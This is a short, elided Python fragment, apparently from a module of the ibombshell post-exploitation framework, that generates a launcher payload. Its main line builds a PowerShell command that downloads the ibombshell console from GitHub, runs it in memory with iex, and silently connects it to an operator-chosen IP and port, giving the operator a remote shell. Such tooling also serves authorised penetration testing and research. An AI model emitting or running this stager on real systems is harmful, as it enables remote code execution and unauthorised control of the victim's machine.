...
class ModuleGenerate(Module):
    ...
    def run(self, code, extension):
        ...
        code_to_encode = """(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/Telefonica/ibombshell/master/console').Content | iex; console -Silently -uriConsole http://{}:{}""".format(self.args['ip'], self.args['port'])
